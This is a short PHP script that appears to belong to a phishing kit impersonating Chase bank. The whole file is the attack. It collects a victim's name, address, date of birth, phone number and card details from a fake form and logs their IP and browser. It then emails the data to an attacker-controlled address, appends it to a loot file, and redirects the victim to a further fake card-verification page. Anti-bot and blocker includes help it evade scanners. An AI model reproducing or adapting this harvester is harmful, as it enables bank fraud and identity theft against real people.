<?php
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";
$message .= "---------- CHASE INFO --------------------\n";
$message .= "Full Name: ".$_POST['5']."\n";
$message .= "Address: ".$_POST['7']."\n";
$message .= "City: ".$_POST['8']."\n";
$message .= "State: ".$_POST['10']."\n";
$message .= "Zip: ".$_POST['9']."\n";
$message .= "Date Birth: ".$_POST['6']."\n";
$message .= "Phone Number: ".$_POST['phoo']."\n";
$message .= "-------------- IP ------------\n";
$message .= "IP: $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$cc = $_POST['ccn'];
$subject = "Result from [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Chase <service>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location: ../verification-card.php");?>